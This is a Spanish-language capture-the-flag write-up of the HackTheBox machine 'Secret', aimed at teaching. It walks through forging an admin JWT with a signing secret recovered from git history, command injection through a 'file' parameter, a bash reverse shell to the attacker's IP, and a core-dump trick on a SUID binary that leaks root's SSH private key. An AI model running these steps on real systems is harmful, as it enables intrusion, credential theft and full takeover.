---
title: "Secret - HTB Writeup"
layout: single
excerpt: "Secret es una máquina de dificultad fácil de la plataforma de HackTheBox. En esta máquina ganamos acceso inicialmente aprovechandonos de una API mal configurada. Para escalar privilegios, abusamos de un binario SUID mal planteado para leer la clave id_rsa de root y así poder acceder como este."
show_date: true
classes: wide
header:
  teaser: https://user-images.githubusercontent.com/67548295/160945531-0a9e77ea-edd5-4673-8a1e-83dacc36e66a.png
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - API
  - SUID
  - Linux
---

![Secret](https://user-images.githubusercontent.com/67548295/160943305-0dd100a2-7873-4a75-bc7f-f51a86496a20.png)

# Enumeración


Empezamos, como no, con la fase de enumeración. Normalmente antes de empezar a escanear puertos y demás cosas envio un paquete [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} a la máquina víctima con la herramienta `ping` para identificar el **sistema operativo** con el que estoy tratando:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ping -c 1 10.10.11.120
PING 10.10.11.120 (10.10.11.120) 56(84) bytes of data.
64 bytes from 10.10.11.120: icmp_seq=1 ttl=63 time=70.7 ms

--- 10.10.11.120 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 70.676/70.676/70.676/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 paquete |

Concluímos que la máquina está **activa** y que es un host con **Linux**, esto se puede deducir atendiendo al valor del **TTL**

Más información sobre la **detección de SO** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

### Nmap

Después de esto, viene la fase de escaneo de puertos. Usamos la famosa herramienta **nmap** para este fin:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.11.120 -sC -sV -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-30 23:56 WEST
Nmap scan report for 10.10.11.120
Host is up (0.069s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.96 seconds
```

| Parámetro | Explícación |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', para agilizar el escaneo ya que este valida el estado de un puerto solo con el primer paso del handshake TCP. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts de enumeracin por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados del escaneo en formato normal, tal cual se ve en el escaneo. |

A través del escaneo podemos identificar tres puertos abiertos:

| Puerto | Servicio |
|:------:|:--------:|
| 22 | Puerto comunmente utilizado por el servicio de [SSH](https://www.hostinger.mx/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"}|
| 80 | Este puerto aloja servicios que usen [HTTP](https://www.pickaweb.es/ayuda/que-es-http/){:target="\_blank"}{:rel="noopener nofollow"}|
| 3000 | Segun el escaneo de nmap, nos dice que en este puerto se aloja la tecnología [node.js](https://www.itdo.com/blog/que-es-node-js-y-para-que-sirve/){:target="\_blank"}{:rel="noopener nofollow"}|

# User.txt

Empezamos enumerando el sitio web presente en el puerto **80** con la herramienta `whatweb`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ whatweb 10.10.11.120
http://10.10.11.120 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)]
IP[10.10.11.120], Lightbox, Meta-Author[Xiaoying Riley at 3rd Wave Media], Script, Title[DUMB Docs], X-Powered-By[Express], X-UA-Compatible[IE=edge], nginx[1.18.0]
```
Podemos ver que se está utilizando **Nginx** y podemos ver el título del sitio. Pero nada más allá que eso.

Veamos como se ve la página web desde el navegador:

![image](https://user-images.githubusercontent.com/67548295/160945982-7078da75-6e7b-4f2f-9f52-c748fb7917b4.png)


Vemos que parece tratarse de una web con documentación para utilizar una API.

Clico en en _Introduction_ y aparece esto:

![image](https://user-images.githubusercontent.com/67548295/160946368-b380d74f-06bc-43f0-b062-7037a8f4396a.png)

Y sí, confirmamos que son instruciónes para usar una API.

Se ve que podemos registrar un usuario. Probemos a hacerlo, no perdemos nada:

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $ curl -X POST http://10.10.11.120:3000/api/user/register -H "Content-Type: application/json" -d '{"name": "z3r0byte","email": "z3r0byte@z3r0.com", "password": "password123"}'
{"user":"z3r0byte"}
```
Bien, parece que lo hemos creado.

Siguiendo más adelante en la documentación vemos varias cosas. Lo primero son dos nombres de dos usuarios potenciales:

![image](https://user-images.githubusercontent.com/67548295/160946898-c87a43da-c9fd-4f07-bdb9-3e3b10c9353d.png)

Podríamos probar algo para ver si estos usuario existen y es intentar registrarlos. Si estos existen, no me debería de dejar registar con estos nombres.

Probemos:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl -X POST http://10.10.11.120:3000/api/user/register -H "Content-Type: application/json" -d '{"name": "dasith","email": "emaildeprueba@test.com", "password": "password123"}';echo
Name already Exist
```
> Usuario `dasith` existe ✔

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl -X POST http://10.10.11.120:3000/api/user/register -H "Content-Type: application/json" -d '{"name": "theadmin","email": "emaildeprueba2@test.com", "password": "password123"}';echo
Name already Exist
```
> Usuario `theadmin` existe ✔

Sigo mirando la documentación de la API y veo como podemos iniciar sesión y recibir un [JWT](https://www.ionos.es/digitalguide/paginas-web/desarrollo-web/json-web-token-jwt/){:target="\_blank"}{:rel="noopener nofollow"}:

![image](https://user-images.githubusercontent.com/67548295/160947872-7336554b-0922-4f93-8dca-3e49a54572da.png)
![image](https://user-images.githubusercontent.com/67548295/160947998-464f5eb9-93e8-4979-b3d3-efd1953339ec.png)

Intento iniciar sesión:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl -X POST http://10.10.11.120:3000/api/user/login -H "Content-Type: application/json" -d '{"email": "z3r0byte@z3r0.com", "password": "password123"}'; echo
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjQ0ZTYxZWY4YjM5MTA0NWIzYzM4YjUiLCJuYW1lIjoiejNyMGJ5dGUiLCJlbWFpbCI6InozcjBieXRlQHozcjAuY29tIiwiaWF0IjoxNjQ4NjgzNTQ3fQ.yXFEXcK3vGVEgOVzsbMDW9aIdVs1CvgP0qupzseT1e4
```
Iniciamos sesión y obtenemos nuestro **JWT**

Lo primero que se me ocurre hacer con este token introducirlo en [jwt.io](https://jwt.io){:target="\_blank"}{:rel="noopener nofollow"} para descifrarlo.

Obtengo lo siguiente:

![image](https://user-images.githubusercontent.com/67548295/160948413-025af3ee-792d-41eb-82dc-af695d402d9a.png)

Algo interesante a probar sería cambiar nuestro nombre por `theadmin` o `dasith` para ver si podemos iniciar sesión con estos usuarios.

Normalmente, esto es algo que no se puede ya que se suele precisar de otro token secreto para editar el **JWT**

Dejo eso pendiente y sigo mirando la documentación.

Por útimo, se nos hace saber que hay una _ruta de acceso privada_ que te devuelve el tipo de usuario que eres: normal o administrador.

![image](https://user-images.githubusercontent.com/67548295/160948990-e23b818c-d41c-49f1-a17e-509afd93e2f0.png)
![image](https://user-images.githubusercontent.com/67548295/160949021-3c501372-31a6-4b3e-90c0-7ff0f19cb537.png)

Pruebo a acceder a esto con el **JWT** del usuario que creamos anteriormente:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl -X GET http://10.10.11.120:3000/api/priv -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjQ0ZTYxZWY4YjM5MTA0NWIzYzM4YjUiLCJuYW1lIjoiejNyMGJ5dGUiLCJlbWFpbCI6InozcjBieXRlQHozcjAuY29tIiwiaWF0IjoxNjQ4NjgzNTQ3fQ.yXFEXcK3vGVEgOVzsbMDW9aIdVs1CvgP0qupzseT1e4"; echo
{"role":{"role":"you are normal user","desc":"z3r0byte"}}
```
Nos dice que que somos un usuario normal.

Bien, no hay más documentación, así que sigo enumerando las distintas secciones de la página hasta que encuentro algo.

![image](https://user-images.githubusercontent.com/67548295/160949505-794d51ae-7b80-42a1-bf3d-ad48805e0570.png)

En el _home_ de la página se nos dá la oportunidad de descargar el código fuente de lo que parece ser la API.

Lo descargo y lo inspecciono:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/local-web]
└──╼ $ ls -la 
total 84
drwxr-xr-x 1 z3r0byte z3r0byte   182 sep  3  2021 .
drwxr-xr-x 1 z3r0byte z3r0byte   562 mar 31 01:02 ..
-rw-r--r-- 1 z3r0byte z3r0byte    72 sep  3  2021 .env
drwxr-xr-x 1 z3r0byte z3r0byte   144 sep  8  2021 .git
-rw-r--r-- 1 z3r0byte z3r0byte   885 sep  3  2021 index.js
drwxr-xr-x 1 z3r0byte z3r0byte    14 ago 13  2021 model
drwxr-xr-x 1 z3r0byte z3r0byte  4158 ago 13  2021 node_modules
-rw-r--r-- 1 z3r0byte z3r0byte   491 ago 13  2021 package.json
-rw-r--r-- 1 z3r0byte z3r0byte 69452 ago 13  2021 package-lock.json
drwxr-xr-x 1 z3r0byte z3r0byte    20 sep  3  2021 public
drwxr-xr-x 1 z3r0byte z3r0byte    80 sep  3  2021 routes
drwxr-xr-x 1 z3r0byte z3r0byte    22 ago 13  2021 src
-rw-r--r-- 1 z3r0byte z3r0byte   651 ago 13  2021 validations.js
```
Entre todos los archivos, me llaman la atención la carpeta `.git` y el archivo `.env`.

Que haya un directorio `.git` quiere decir que problablemente esto sea un repositorio.

Veamos que contiene el archivo `.env`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/local-web]
└──╼ $ cat .env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```
Vemos que parece ser un token que se ha borrado o reemplazado.

Algo que se me ocurre en este momento es intentar ver los `commits` de este repositorio. Para ver si de verdad hubo un token aquí.

Podemos listar los **commits** que han habido con el siguiente comando:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/local-web]
└──╼ $ git log
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:27:35 2021 +0530

    removed swap

commit 3a367e735ee76569664bf7754eaaade7c735d702
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:26:39 2021 +0530

    added downloads

commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:25:52 2021 +0530

    first commit
```

Veo un commit con un título sospechoso, _"removed .env for security reasons"_. 

Pruebo a ver que fue editado en este commit con el commando `git show <commit_id>`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/local-web]
└──╼ $ git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```
¡Y sí!, como había supuesto, el token había sido borrado.

¿Puede que sea este el token para poder editar los **JWT**? Lo dejaré pendiente por probar, de momento sigo inspeccionando el código fuente.

Tras rebuscar un buen rato, me encuentro con algo interesante. Precisamente en el archivo `local-web/routes/private.js`:

![image](https://user-images.githubusercontent.com/67548295/160951270-b2498370-4475-4477-899e-002504907146.png)

Vemos el archivo que maneja la _ruta de acceso privada_ que probamos antes.

También se aprecia que esta ruta `/priv` a la que estabamos intentando acceder antes valida si el nombre en el **JWT** es `theadmin`.

Pero no solo eso, tambien encuentro esto en el mismo archivo:

![image](https://user-images.githubusercontent.com/67548295/160951792-f211326d-f165-4107-86d9-931f4c823b70.png)

Descubro otra ruta, `/logs` la cual ejecuta un comando a nivel de sistema pasandole como argumento lo que nosotros introduzcamos en el parametro GET "_file_".

Esto es crítico, ya que nos permitiría ejecutar comandos de forma arbitraria.

Pero para hacer esto tenemos que encontrar ver la manera de ser `theadmin` al realizar la petición, ya que estas vulnerables líneas de código están en un **condicional if** que evalua si el nombre en el JWT es `theadmin`

Bien, antes habíamos encontrado un token en un commit. Probemos si podemos editar nuestro JWT con este token:

Para ello, genero mi **JWT** con mi usuario creado y lo introduzco en [jwt.io](https://jwt.io){:target="\_blank"}{:rel="noopener nofollow"}:

![image](https://user-images.githubusercontent.com/67548295/160952463-7e0e24ae-127f-44c1-a73e-42a9eef262d3.png)

Ahora cambiamos el valor del campo _name_ por `theadmin`. También colocamos el token que encontramos en la sección _verify signature_:

![image](https://user-images.githubusercontent.com/67548295/160952720-0923683d-aae1-4b7a-8648-3c98c7a9243f.png)

Bien, ahora copiamos el **JWT** obtenido e intentamos acceder a la ruta `/priv` por ejemplo:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/local-web/routes]
└──╼ $ curl -X GET http://10.10.11.120:3000/api/priv -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjQ0ZTYxZWY4YjM5MTA0NWIzYzM4YjUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InozcjBieXRlQHozcjAuY29tIiwiaWF0IjoxNjQ4NjgzNTQ3fQ.PKplW4pupx9CCUREmMxvUVdkdlYmmmkWNq9uvYa6Elo" ; echo
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```
¡Ha funcionado!

Probemos ahora a acceder a la ruta `/logs` la cual habíamos visto antes que era vulnerable:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/local-web/routes]
└──╼ $ curl -X GET http://10.10.11.120:3000/api/logs -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjQ0ZTYxZWY4YjM5MTA0NWIzYzM4YjUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InozcjBieXRlQHozcjAuY29tIiwiaWF0IjoxNjQ4NjgzNTQ3fQ.PKplW4pupx9CCUREmMxvUVdkdlYmmmkWNq9uvYa6Elo" ; echo
{"killed":false,"code":128,"signal":null,"cmd":"git log --oneline undefined"}
```
Interesante. Probemos añadirle el parametro GET `file` con algun valor especial para ver si se ejecutan comandos, por ejemplo `;whoami`

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/local-web/routes]
└──╼ $ curl -X GET 'http://10.10.11.120:3000/api/logs?file=;id' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjQ0ZTYxZWY4YjM5MTA0NWIzYzM4YjUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InozcjBieXRlQHozcjAuY29tIiwiaWF0IjoxNjQ4NjgzNTQ3fQ.PKplW4pupx9CCUREmMxvUVdkdlYmmmkWNq9uvYa6Elo" ; echo
"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```
¡Vemos que podemos ejecutar comandos!

Probemos a entablar una reverse shell.

Para ello creamos un archivo con nombre `index.html` con el siguiente contenido:

> `bash -i >& /dev/tcp/TU_IP/4444 0>&1`

Luego, montamos un pequeño servidor HTTP con **python**, con el siguiente comando:

> `python3 -m http.server 8000`

Por último, mandamos la siguiente petición para que entable la reverse shell:

![image](https://user-images.githubusercontent.com/67548295/160954519-1ceaca17-5f58-4c82-93ff-9d5bc3f8c723.png)

Conseguimos acceder inicialmente.

A partir de este punto podremos visualizar la flag `user.txt` en `/home/dasith/user.txt`:

```bash
dasith@secret:~/local-web$ head --bytes 15 /home/dasith/user.txt | xargs
cffd56207776a15
```

# Root.txt

Enumero el sistema en busca de posibles vectores de escalada de privilegios.

Hasta que pruebo por enumerar archivos SUID y encuentro algo:

```bash
dasith@secret:~$ find / -perm -4000 2>/dev/null
[...]
/opt/count
/snap/snapd/13640/usr/lib/snapd/snap-confine
/snap/snapd/13170/usr/lib/snapd/snap-confine
```
Mmmmh, `/opt/count`, este archivo no es que sea muy común, inspeccionemoslo.

Accedo al directorio del archivo y veo que es un binario del cual también se comparte el código:

```bash
dasith@secret:/opt$ ls
code.c  count  valgrind.log
```
Lo primero que hago es ejecutar el binario para ver como funciona:

```bash
Enter source file/directory name: /etc/passwd

Total characters = 1881
Total words      = 51
Total lines      = 36
Save results a file? [y/N]: y
Path: /tmp/results.txt

dasith@secret:/opt$ cat /tmp/results.txt 
Total characters = 1881
Total words      = 51
Total lines      = 36
```
El programa pide un nombre de un archivo o directorio del cual genera unas estadisticas, despues te da la opción de guardar los resultados.

Recordemos que es un binario SUID con propietario root, asi que el programa podria leer cualquier archivo del sistema.

Bien, la función **main** del código me encuentro con algo interesante:

![image](https://user-images.githubusercontent.com/67548295/160955807-699aca4d-a5dc-44ec-9ced-eb91f5cd7c20.png)

Busco información sobre esto del `coredump` y encuentro esto:

![image](https://user-images.githubusercontent.com/67548295/160956012-7949c409-1b1a-417b-8dd3-b6af4f316f72.png)

Básicamente es un sistema de debugging que guarda los datos del programa si este _crashea_

Esto podria estar interesante ya que si especificamos un archivo privilegiado al binario y luego provocamos un **coredump**, el contenido del archivo privilegiado podría volcarse también.

Lo primero que hago es buscar como provocar un **coredump**, y veo que se puede hacer fácilmente con el comando `kill -ABRT <pid>`:

![image](https://user-images.githubusercontent.com/67548295/160956694-6a4db793-9ecb-48ec-ae5d-fef4aedd77f3.png)

Y lo hacemos especificando la clave id_rsa de SSH del usuario root, suponiendo que esta existe:

```bash
dasith@secret:/opt$ ./count 
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count

dasith@secret:/opt$ ps
    PID TTY          TIME CMD
   1814 pts/1    00:00:00 sh
   1815 pts/1    00:00:00 bash
   1880 pts/1    00:00:00 count
   1884 pts/1    00:00:00 ps
   
dasith@secret:/opt$ kill -ABRT 1880
dasith@secret:/opt$ fg
./count
Aborted (core dumped)
```
Perfecto, ahora tendremos que ver donde se localiza este volcado de memoria. Lo encuentro fácil en Internet:

![image](https://user-images.githubusercontent.com/67548295/160957203-3a727aa5-2ac3-4129-9daa-ef249422a955.png)

Voy a esa ruta y veo esto:

```bash
dasith@secret:/var/crash$ ls -lt
total 84
-rw-r----- 1 dasith dasith 31393 Mar 30 22:38 _opt_count.1000.crash
-rw-r----- 1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r----- 1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash
```
Nuestro archivo es `_opt_count.1000.crash` ya que es el más reciente.

Intento leer este archivo pero parece imposible ya que contiene muchos carácteres ilegibles. Una vez más busco en internet:

![image](https://user-images.githubusercontent.com/67548295/160957851-dec12c91-825b-47d3-9c38-b1eff6e72ea0.png)

Parece que hay que utilizar la herramienta `apport-unpack`, la sinxtaxis es muy simple, solo hay que especificar el archivo .crash y el destino del directorio generado.

Bien, hagamoslo:

```bash
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/test
dasith@secret:/var/crash$ cd /tmp/test/
dasith@secret:/tmp/test$ ls -l
total 432
-rw-r--r-- 1 dasith dasith      5 Mar 31 01:30 Architecture
-rw-r--r-- 1 dasith dasith 380928 Mar 31 01:30 CoreDump
-rw-r--r-- 1 dasith dasith      1 Mar 31 01:30 CrashCounter
-rw-r--r-- 1 dasith dasith     24 Mar 31 01:30 Date
-rw-r--r-- 1 dasith dasith     12 Mar 31 01:30 DistroRelease
-rw-r--r-- 1 dasith dasith     10 Mar 31 01:30 ExecutablePath
-rw-r--r-- 1 dasith dasith     10 Mar 31 01:30 ExecutableTimestamp
-rw-r--r-- 1 dasith dasith      5 Mar 31 01:30 ProblemType
-rw-r--r-- 1 dasith dasith      7 Mar 31 01:30 ProcCmdline
-rw-r--r-- 1 dasith dasith      4 Mar 31 01:30 ProcCwd
-rw-r--r-- 1 dasith dasith     61 Mar 31 01:30 ProcEnviron
-rw-r--r-- 1 dasith dasith   2144 Mar 31 01:30 ProcMaps
-rw-r--r-- 1 dasith dasith   1336 Mar 31 01:30 ProcStatus
-rw-r--r-- 1 dasith dasith      1 Mar 31 01:30 Signal
-rw-r--r-- 1 dasith dasith     29 Mar 31 01:30 Uname
-rw-r--r-- 1 dasith dasith      3 Mar 31 01:30 UserGroups
```
Lo importante está en el archivo `CoreDump`, usemos la herramienta `strings` para ver si podemos ver la clave **id_rsa** en el archivo:

```bash
[...]
Could not open %s for writing                                                                                                                                                                
:*3$"                                                                                                                                                                                        
Save results a file? [y/N]: l words      = 45                                                                                                                                                
Total lines      = 39                                                                                                                                                                        
/root/.ssh/id_rsa                                                                                                                                                                            
-----BEGIN OPENSSH PRIVATE KEY-----         

             HIDDEN

-----END OPENSSH PRIVATE KEY-----              
aliases                                        
ethers                                         
group                                          
gshadow                                        
hosts                                          
initgroups                                     
netgroup                                
[...]
```
¡Ahí está!, ya lo uńico que queda hacer es copiar esta id_rsa y acceder como root:

```bash
dasith@secret:~$ nano id_rsa
dasith@secret:~$ chmod 600 id_rsa
dasith@secret:~$ ssh -i id_rsa root@localhost
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 31 Mar 2022 01:43:44 AM UTC

  System load:           0.03
  Usage of /:            52.7% of 8.79GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             230
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.120
  IPv6 address for eth0: dead:beef::250:56ff:feb9:4818


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct 26 15:13:55 2021
root@secret:~# 
```
¡Y ya está!, una vez en este punto podremos ver la flag `root.txt` en `/root/root.txt`:

```bash
root@secret:~# head --bytes 15 /root/root.txt | xargs
e20126d11b3b330
```
